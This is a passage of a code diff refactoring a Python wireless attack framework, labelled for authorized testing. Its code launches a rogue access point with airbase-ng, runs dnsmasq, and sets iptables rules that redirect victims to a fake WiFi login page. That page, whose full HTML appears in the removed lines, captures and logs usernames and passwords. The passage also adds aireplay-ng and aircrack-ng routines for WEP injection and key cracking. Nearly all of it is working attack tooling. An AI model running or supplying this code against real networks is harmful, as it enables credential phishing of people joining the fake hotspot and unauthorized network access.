-                    print(f"\n[CAPTURED] {username}:{password} from {client_ip}")
-
-                    # Send fake error response
                     self.send_response(200)
                     self.send_header('Content-type', 'text/html')
                     self.end_headers()
-                    error_html = '''
-                    <html><body>
-                    <h2>Authentication Failed</h2>
-                    <p>Invalid credentials. Please try again.</p>
-                    <a href="/">Back to login</a>
-                    </body></html>
-                    '''
-                    self.wfile.write(error_html.encode())
+                    self.wfile.write(b'<html><body><h2>Authentication Failed</h2>'
+                                     b'<p>Invalid credentials. Please try again.</p>'
+                                     b'<a href="/">Back</a></body></html>')
                 else:
                     self.send_error(404)
 
-            def log_message(self, format, *args):
-                # Suppress normal HTTP logs
-                pass
+            def log_message(self, fmt, *args):
+                pass  # suppress HTTP logs
 
-        # Start services
         processes = []
-        httpd = None
+        httpd     = None
 
         try:
-            # 1. Create dnsmasq config
-            dnsmasq_conf = portal_dir / 'dnsmasq.conf'
-            with open(dnsmasq_conf, 'w') as f:
-                f.write(f'''interface=at0
-            bind-interfaces
-            dhcp-range=192.168.1.100,192.168.1.200,12h
-            dhcp-option=3,192.168.1.1
-            dhcp-option=6,192.168.1.1
-            no-resolv
-            no-poll
-            port=0
-            ''')
+            # Write dnsmasq config
+            dnsmasq_conf = self.temp_dir / 'dnsmasq.conf'
+            dnsmasq_conf.write_text(
+                "interface=at0\n"
+                "bind-interfaces\n"
+                "dhcp-range=192.168.1.100,192.168.1.200,12h\n"
+                "dhcp-option=3,192.168.1.1\n"
+                "dhcp-option=6,192.168.1.1\n"
+                "no-resolv\nno-poll\nport=0\n"
+            )
 
-            # 2. Start airbase-ng (rogue AP)
+            # Start airbase-ng
             print("Starting rogue AP...")
-            airbase_cmd = [
-                'sudo', self.tool_paths['airbase-ng'],
-                '-e', self.target_network['essid'],
-                '-c', self.target_network['channel'],
-                self.selected_interface
+            ab_cmd = [
+                'sudo', airbase,
+                '-e', target_ssid,
+                '-c', target.get('channel', '6').strip(),
+                mon
             ]
-
-            airbase_proc = subprocess.Popen(airbase_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            processes.append(('airbase-ng', airbase_proc))
+            ab_proc = subprocess.Popen(ab_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.registry.register('rogue_ap', ab_proc)
+            processes.append(('airbase-ng', ab_proc))
             time.sleep(3)
-            print("\n" * 2)
 
-            # 3. Configure at0 interface
-            print("Configuring network...")
+            # Configure at0
             subprocess.run(['sudo', 'ip', 'link', 'set', 'at0', 'up'], check=True)
             subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.1.1/24', 'dev', 'at0'], check=True)
 
-            # 4. Start dnsmasq
+            # Start dnsmasq
             print("Starting DHCP/DNS server...")
-            dnsmasq_cmd = [
-                'sudo', self.tool_paths['dnsmasq'],
-                '-C', str(dnsmasq_conf),
-                '--no-daemon',
-                '--log-dhcp',  # Add DHCP logging
-                '--log-queries'  # Add DNS logging
-            ]
-            dnsmasq_proc = subprocess.Popen(dnsmasq_cmd)  # Remove DEVNULL to see output
-            processes.append(('dnsmasq', dnsmasq_proc))
-            time.sleep(2)
+            dm_cmd = ['sudo', dnsmasq, '-C', str(dnsmasq_conf), '--no-daemon']
+            dm_proc = subprocess.Popen(dm_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.registry.register('dnsmasq', dm_proc)
+            processes.append(('dnsmasq', dm_proc))
+            time.sleep(1)
 
-            # Verify at0 is configured
-            print("Verifying at0 interface...")
-            result = subprocess.run(['ip', 'addr', 'show', 'at0'], capture_output=True, text=True)
-            print(result.stdout)
+            # iptables
+            subprocess.run([
+                'sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING',
+                '-i', 'at0', '-p', 'tcp', '--dport', '80',
+                '-j', 'DNAT', '--to-destination', '192.168.1.1:80'
+            ], capture_output=True)
+            subprocess.run([
+                'sudo', 'iptables', '-A', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'
+            ], capture_output=True)
+            subprocess.run([
+                'sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'
+            ], capture_output=True)
 
-            # 5. Set up iptables for NAT and port forwarding
-            print("Configuring firewall rules...")
-            # Redirect all HTTP traffic to our web server
-            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', 'at0',
-                        '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'],
-                        capture_output=True)
-
-            # Allow forwarding from at0
-            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
-                        capture_output=True)
-
-            # Enable IP forwarding
-            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'],
-                        capture_output=True)
-
-            # 6. Start web server
-            print("Starting captive portal web server...")
-            PORT = 80
-
-            httpd = socketserver.TCPServer(("192.168.1.1", PORT), CaptivePortalHandler)
-            httpd.target_ssid = self.target_network['essid']
-            httpd.creds_file = creds_file
+            # Start web server
+            print("Starting captive portal web server on port 80...")
+            httpd = socketserver.TCPServer(('192.168.1.1', 80), CaptivePortalHandler)
 
             print(f"\n{'='*70}")
             print("ROGUE AP ACTIVE")
             print(f"{'='*70}")
-            print(f"SSID: {self.target_network['essid']}")
-            print(f"Portal: http://192.168.1.1")
-            print(f"Credentials logged to: {creds_file}")
-            print(f"\nWaiting for clients to connect...")
+            print(f"SSID:        {target_ssid}")
+            print(f"Portal:      http://192.168.1.1")
+            print(f"Credentials: {creds_file}")
             print("Press Ctrl+C to stop")
             print(f"{'='*70}\n")
-            sys.stdout.flush()
 
             httpd.serve_forever()
 
         except KeyboardInterrupt:
-            print("\n\nStopping services...")
+            print("\nStopping...")
         except Exception as e:
-            print(f"\nError: {e}")
+            print(f"Error: {e}")
         finally:
-            # Cleanup
-            print("Cleaning up...")
-
-            # Stop web server
             if httpd:
                 try:
                     httpd.shutdown()
                     httpd.server_close()
-                    print("Stopped web server")
-                except:
+                except Exception:
                     pass
 
-            # Stop processes
             for name, proc in processes:
-                try:
-                    proc.terminate()
-                    proc.wait(timeout=5)
-                    print(f"Stopped {name}")
-                except:
-                    try:
-                        proc.kill()
-                        proc.wait(timeout=2)
-                    except:
-                        pass
+                self.registry.terminate(name)
 
-            # Clean up iptables rules
-            print("Removing firewall rules...")
-            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', 'at0',
-                        '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
-                        capture_output=True)
+            # iptables cleanup
             subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
             subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)
 
-            # Remove at0 interface
-            print("Removing at0 interface...")
-            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', 'at0'], capture_output=True)
-            subprocess.run(['sudo', 'ip', 'link', 'set', 'at0', 'down'], capture_output=True)
-            subprocess.run(['sudo', 'ip', 'link', 'delete', 'at0'], capture_output=True)
+            # at0 cleanup
+            for cmd in (
+                ['sudo', 'ip', 'addr', 'flush', 'dev', 'at0'],
+                ['sudo', 'ip', 'link', 'set', 'at0', 'down'],
+                ['sudo', 'ip', 'link', 'delete', 'at0'],
+            ):
+                subprocess.run(cmd, capture_output=True)
 
-            # Reset attack interface from PROMISC mode
-            print(f"Resetting {self.selected_interface}...")
-            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'promisc', 'off'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'down'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
-                        capture_output=True)
+            print("Portal cleanup complete.")
 
-            # Remove dnsmasq config file
-            try:
-                dnsmasq_conf = portal_dir / 'dnsmasq.conf'
-                if dnsmasq_conf.exists():
-                    dnsmasq_conf.unlink()
-            except:
-                pass
+    # ------------------------------------------------------------------
+    # WEP attacks
+    # ------------------------------------------------------------------
 
-            print("Rogue AP cleanup complete")
+    def _wep_preamble(self, target: dict, attack_name: str) -> str | None:
+        aireplay = self._require_tool('aireplay-ng')
+        if not aireplay:
+            return None
+        print(f"\n{attack_name}")
+        print(f"Target: {target['essid']} ({target['bssid']})")
+        self._set_target_channel(target)
+        return aireplay
 
-    def default_captive_portal(self):
-        """Use default captive portal"""
-        print("\n" + "="*60)
-        print("DEFAULT CAPTIVE PORTAL")
-        print("="*60)
-
-        # Prompt for SSID name
-        if self.target_network and self.target_network['essid'] != '[Hidden]':
-            default_ssid = self.target_network['essid']
-            prompt = f"Enter SSID for rogue AP (default: {default_ssid}): "
-        else:
-            default_ssid = "Free_WiFi"
-            prompt = "Enter SSID for rogue AP (default: Free_WiFi): "
-
-        target_ssid = input(prompt).strip() or default_ssid
-
-        portal_dir = Path(f"./captive_portals/{target_ssid.replace(' ', '_')}_default")
-        portal_dir.mkdir(parents=True, exist_ok=True)
-
-        print(f"\nCreating portal for SSID: {target_ssid}")
-
-        # Create the default portal
-        portal_html_dir = self.create_default_portal(portal_dir, target_ssid)
-
-        print("\nStarting infrastructure:")
-        print("  - Rogue AP (airbase-ng)")
-        print("  - DHCP server (dnsmasq)")
-        print("  - DNS redirect")
-        print("  - Web server (Python)")
-        print("\nPress Ctrl+C to stop all services\n")
-
-        input("Press Enter to start, or Ctrl+C to cancel...")
-
-        # Update target_network with the chosen SSID for the rogue AP
-        if not self.target_network:
-            self.target_network = {
-                'essid': target_ssid,
-                'channel': '6',
-                'bssid': '00:00:00:00:00:00'
-            }
-        else:
-            self.target_network['essid'] = target_ssid
-
-        # Use the same launch method, just with different portal directory
-        self.launch_rogue_ap_with_portal(portal_dir, portal_subdir='default_portal')
-
-    def create_default_portal(self, portal_dir, ssid):
-        """Create a professional default captive portal"""
-
-        # Create portal directory structure
-        portal_html_dir = portal_dir / 'default_portal'
-        portal_html_dir.mkdir(parents=True, exist_ok=True)
-
-        # Create a professional-looking captive portal HTML
-        html_content = f'''<!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>WiFi Login - {ssid}</title>
-        <style>
-            * {{
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }}
-
-            body {{
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                padding: 20px;
-            }}
-
-            .container {{
-                background: white;
-                border-radius: 12px;
-                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-                max-width: 400px;
-                width: 100%;
-                padding: 40px;
-            }}
-
-            .logo {{
-                text-align: center;
-                margin-bottom: 30px;
-            }}
-
-            .wifi-icon {{
-                width: 80px;
-                height: 80px;
-                margin: 0 auto 20px;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                border-radius: 50%;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                font-size: 40px;
-                color: white;
-            }}
-
-            h1 {{
-                color: #333;
-                font-size: 24px;
-                text-align: center;
-                margin-bottom: 10px;
-            }}
-
-            .network-name {{
-                text-align: center;
-                color: #667eea;
-                font-weight: 600;
-                font-size: 18px;
-                margin-bottom: 30px;
-            }}
-
-            .welcome-text {{
-                text-align: center;
-                color: #666;
-                margin-bottom: 30px;
-                line-height: 1.5;
-            }}
-
-            .form-group {{
-                margin-bottom: 20px;
-            }}
-
-            label {{
-                display: block;
-                color: #333;
-                font-weight: 500;
-                margin-bottom: 8px;
-                font-size: 14px;
-            }}
-
-            input {{
-                width: 100%;
-                padding: 12px 15px;
-                border: 2px solid #e0e0e0;
-                border-radius: 6px;
-                font-size: 15px;
-                transition: border-color 0.3s;
-            }}
-
-            input:focus {{
-                outline: none;
-                border-color: #667eea;
-            }}
-
-            button {{
-                width: 100%;
-                padding: 14px;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                color: white;
-                border: none;
-                border-radius: 6px;
-                font-size: 16px;
-                font-weight: 600;
-                cursor: pointer;
-                transition: transform 0.2s, box-shadow 0.2s;
-            }}
-
-            button:hover {{
-                transform: translateY(-2px);
-                box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
-            }}
-
-            button:active {{
-                transform: translateY(0);
-            }}
-
-            .terms {{
-                text-align: center;
-                margin-top: 20px;
-                font-size: 12px;
-                color: #999;
-            }}
-
-            .terms a {{
-                color: #667eea;
-                text-decoration: none;
-            }}
-
-            .footer {{
-                text-align: center;
-                margin-top: 30px;
-                padding-top: 20px;
-                border-top: 1px solid #e0e0e0;
-                color: #999;
-                font-size: 12px;
-            }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="logo">
-                <div class="wifi-icon">📶</div>
-                <h1>WiFi Access</h1>
-                <div class="network-name">{ssid}</div>
-            </div>
-
-            <div class="welcome-text">
-                Welcome! Please sign in to access the internet.
-            </div>
-
-            <form action="/capture_credentials" method="post">
-                <div class="form-group">
-                    <label for="username">Email or Username</label>
-                    <input type="text" id="username" name="username" required placeholder="Enter your email">
-                </div>
-
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" required placeholder="Enter your password">
-                </div>
-
-                <button type="submit">Connect to WiFi</button>
-            </form>
-
-            <div class="terms">
-                By connecting, you agree to our <a href="#">Terms of Service</a>
-            </div>
-
-            <div class="footer">
-                Secure WiFi Connection
-            </div>
-        </div>
-    </body>
-    </html>'''
-
-        # Write the HTML file
-        index_file = portal_html_dir / 'index.html'
-        with open(index_file, 'w', encoding='utf-8') as f:
-            f.write(html_content)
-
-        print(f"Default portal created at: {portal_html_dir}")
-        return portal_html_dir
-
-    def cleanup_and_restore_interfaces(self):
-        """Restore interfaces and network services on exit"""
-        print("\n" + "="*60)
-        print("RESTORING NETWORK INTERFACES")
-        print("="*60)
-
+    def _attack_wep_fake_auth(self, target: dict, params: dict):
+        aireplay = self._wep_preamble(target, "WEP FAKE AUTHENTICATION")
+        if not aireplay:
+            return
+        mon = self.iface_mgr.monitor_interface
+        cmd = ['sudo', aireplay, '-1', '0', '-a', target['bssid'], mon]
+        print("Associating with AP for packet injection...\n")
         try:
-            # Kill any lingering attack processes first
-            print("Stopping attack processes...")
-            attack_processes = [
-                'airbase-ng', 'airodump-ng', 'aireplay-ng',
-                'mdk3', 'hostapd', 'dnsmasq'
-            ]
+            subprocess.run(cmd)
+        except KeyboardInterrupt:
+            print("\nStopped.")
 
-            for proc in attack_processes:
-                subprocess.run(['sudo', 'pkill', '-9', proc],
-                            capture_output=True, stderr=subprocess.DEVNULL)
+    def _attack_wep_arp_replay(self, target: dict, params: dict):
+        aireplay = self._wep_preamble(target, "WEP ARP REPLAY ATTACK")
+        if not aireplay:
+            return
+        mon = self.iface_mgr.monitor_interface
+        cmd = ['sudo', aireplay, '-3', '-b', target['bssid'], mon]
+        print("Capturing and replaying ARP packets to generate IVs...\n")
+        try:
+            subprocess.run(cmd)
+        except KeyboardInterrupt:
+            print("\nStopped.")
 
-            time.sleep(1)
+    def _attack_wep_fragmentation(self, target: dict, params: dict):
+        aireplay = self._wep_preamble(target, "WEP FRAGMENTATION ATTACK")
+        if not aireplay:
+            return
+        mon = self.iface_mgr.monitor_interface
+        cmd = ['sudo', aireplay, '-5', '-b', target['bssid'], mon]
+        print("Obtaining keystream for packet injection...\n")
+        try:
+            subprocess.run(cmd)
+        except KeyboardInterrupt:
+            print("\nStopped.")
 
-            # Clean up virtual interfaces
-            print("Removing virtual interfaces...")
-            virtual_ifaces = ['at0', 'mon0']
-            for viface in virtual_ifaces:
-                subprocess.run(['sudo', 'ip', 'link', 'delete', viface],
-                            capture_output=True, stderr=subprocess.DEVNULL)
+    def _attack_wep_chopchop(self, target: dict, params: dict):
+        aireplay = self._wep_preamble(target, "WEP CHOPCHOP ATTACK")
+        if not aireplay:
+            return
+        mon = self.iface_mgr.monitor_interface
+        cmd = ['sudo', aireplay, '-4', '-b', target['bssid'], mon]
+        print("Decrypting WEP packets without key...\n")
+        try:
+            subprocess.run(cmd)
+        except KeyboardInterrupt:
+            print("\nStopped.")
 
-            # Clean up iptables rules
-            print("Cleaning firewall rules...")
-            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'iptables', '-X'],
-                        capture_output=True)
+    def _attack_wep_crack(self, target: dict, params: dict):
+        aircrack = self._require_tool('aircrack-ng')
+        if not aircrack:
+            return
+        cap_file = input("Enter capture file (.cap): ").strip()
+        if not Path(cap_file).exists():
+            print(f"File not found: {cap_file}")
+            return
+        print(f"\nCRACK WEP KEY from {cap_file}")
+        print("Requires 40,000-85,000 IVs.\n")
+        try:
+            subprocess.run(['sudo', aircrack, cap_file])
+        except KeyboardInterrupt:
+            print("\nStopped.")
 
-            if not self.selected_interface:
-                print("No interface was selected.")
-            else:
-                print(f"Resetting {self.selected_interface}...")
+    # ------------------------------------------------------------------
+    # Cleanup
+    # ------------------------------------------------------------------
 
-                # Check if interface exists
-                result = subprocess.run(['ip', 'link', 'show', self.selected_interface],
-                                    capture_output=True)
-                if result.returncode != 0:
-                    print(f"Interface {self.selected_interface} not found, skipping reset")
-                else:
-                    # Turn off promiscuous mode
-                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'promisc', 'off'],
-                                capture_output=True, stderr=subprocess.DEVNULL)
+    def _full_cleanup(self):
+        print("\n" + "=" * 60)
+        print("CLEANING UP")
+        print("=" * 60)
 
-                    # Bring interface down
-                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'down'],
-                                capture_output=True)
+        # Stop all registered processes
+        self.registry.terminate_all()
 
-                    time.sleep(1)
+        # Kill any lingering wireless attack binaries
+        for binary in ('airbase-ng', 'airodump-ng', 'aireplay-ng', 'mdk3', 'dnsmasq'):
+            self.registry.kill_by_name(binary)
 
-                    # Reset to managed mode
-                    subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
-                                capture_output=True, stderr=subprocess.DEVNULL)
+        time.sleep(1)
 
-                    # Remove any manual IP addresses
-                    subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', self.selected_interface],
-                                capture_output=True)
+        # Remove virtual interfaces
+        for viface in ('at0', 'mon0'):
+            subprocess.run(['sudo', 'ip', 'link', 'delete', viface], capture_output=True)
 
-                    # Bring interface back up
-                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
-                                capture_output=True)
+        # iptables cleanup
+        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
+        subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)
 
-                    time.sleep(2)
+        # Restore interface
+        self.iface_mgr.disable_monitor_mode()
 
-            # Restart system DNS services
-            print("Restarting system services...")
+        # Remove temp directory
+        try:
+            shutil.rmtree(self.temp_dir, ignore_errors=True)
+        except Exception:
+            pass
 
-            # Restart systemd-resolved (if it was stopped)
-            subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'],
-                        capture_output=True, stderr=subprocess.DEVNULL)
+        # Restore DNS
+        subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'], capture_output=True)
+        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], capture_output=True)
 
-            # Restart NetworkManager (use restart instead of start)
-            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
-                        capture_output=True)
+        print("Cleanup complete.")
 
-            time.sleep(2)
-
-            # Verify interface is back in managed mode
-            if self.selected_interface:
-                result = subprocess.run(['iwconfig', self.selected_interface],
-                                    capture_output=True, text=True)
-                if 'Mode:Managed' in result.stderr or 'Mode:Managed' in result.stdout:
-                    print(f"✓ {self.selected_interface} restored to managed mode")
-                else:
-                    print(f"⚠ {self.selected_interface} may not be in managed mode")
-
-                # Check NetworkManager control
-                nm_check = subprocess.run(['nmcli', 'device', 'status'],
-                                        capture_output=True, text=True)
-                if self.selected_interface in nm_check.stdout:
-                    for line in nm_check.stdout.split('\n'):
-                        if self.selected_interface in line:
-                            print(f"  NetworkManager status: {line.strip()}")
-                            break
-
-            print("\nInterface restoration complete")
-
-        except Exception as e:
-            print(f"Cleanup error: {e}")
-
-    def get_all_wireless_interfaces(self):
-        """Get all wireless interfaces (not just available ones)"""
-        interfaces = []
-        net_path = Path('/sys/class/net')
-
-        if net_path.exists():
-            for iface_dir in net_path.iterdir():
-                if (iface_dir / 'wireless').exists():
-                    interfaces.append(iface_dir.name)
-
-        return sorted(set(interfaces))
+    # ------------------------------------------------------------------
+    # Main loop
+    # ------------------------------------------------------------------
 
     def run(self):
-        """Main program loop"""
-        print("WIRELESS ATTACK FRAMEWORK")
-        print("FOR AUTHORIZED SECURITY TESTING ONLY")
-        print("="*60)
+        print("=" * 60)
+        print(" RED CELL SECURITY - WIRELESS ATTACK FRAMEWORK")
+        print(" FOR AUTHORIZED SECURITY TESTING ONLY")
+        print("=" * 60)
 
         try:
-            # Select interface
-            if not self.select_interface():
+            if not self._setup_interfaces():
                 return
 
-            # Select target
-            if not self.select_target_network():
-                return
+            mon = self.iface_mgr.capture_interface
 
-            # Main menu loop
             while True:
-                try:
-                    self.display_attack_menu()
-                    choice = input("\nSelect attack (1-11): ").strip()
+                # Instantiate scan engine for this scan session
+                self.scan_engine = ScanEngine(
+                    monitor_interface=mon,
+                    temp_dir=self.temp_dir,
+                    supports_5ghz=self.iface_mgr.supports_5ghz,
+                )
 
-                    if choice == '1':
-                        self.deauth_attack()
-                    elif choice == '2':
-                        self.dos_attacks_menu()
-                    elif choice == '3':
-                        self.evil_twin_attack()
-                    elif choice == '4':
-                        self.karma_attack()
-                    elif choice == '5':
-                        self.captive_portal_attack()
-                    elif choice == '6':
-                        self.pmkid_capture()
-                    elif choice == '7':
-                        self.wpa_handshake_capture()
-                    elif choice == '8':
-                        self.wep_attacks_menu()
-                    elif choice == '9':
-                        self.select_target_network()
-                    elif choice == '10':
-                        self.select_interface()
-                    elif choice == '11':
-                        print("\nExiting...")
+                print(f"\nStarting live scan on {mon}...")
+                print("Use SPACE to select targets, ENTER to confirm, Q to quit.")
+                time.sleep(1)
+
+                # Run curses scan display
+                self.selected_targets = self.scan_engine.run_display()
+
+                if not self.selected_targets:
+                    print("\nNo targets selected.")
+                    retry = input("Scan again? (y/n): ").strip().lower()
+                    if retry != 'y':
                         break
-                    else:
-                        print("Invalid selection.")
+                    continue
 
-                except KeyboardInterrupt:
-                    print("\n\nExiting...")
+                print(f"\nSelected {len(self.selected_targets)} target(s):")
+                for t in self.selected_targets:
+                    print(f"  - {t['essid']} ({t['bssid']}) CH:{t['channel']}")
+
+                # Build and execute attack queue
+                result = self._build_attack_queue()
+
+                if result == 'rescan':
+                    continue
+                elif result == 'quit':
                     break
 
+        except KeyboardInterrupt:
+            print("\nInterrupted.")
         finally:
-            # Always cleanup on exit
-            self.cleanup_and_restore_interfaces()
+            self._full_cleanup()
+
+
+# =============================================================================
+# Entry point
+# =============================================================================
 
 def main():
     if os.geteuid() != 0:
         print("This tool requires root privileges.")
-        print("Run with: sudo python3 attack_framework.py")
+        print("Run with: sudo python3 wireless_attack_framework.py")
         sys.exit(1)
 
     framework = WirelessAttackFramework()
     framework.run()
+
 
 if __name__ == "__main__":
     main()
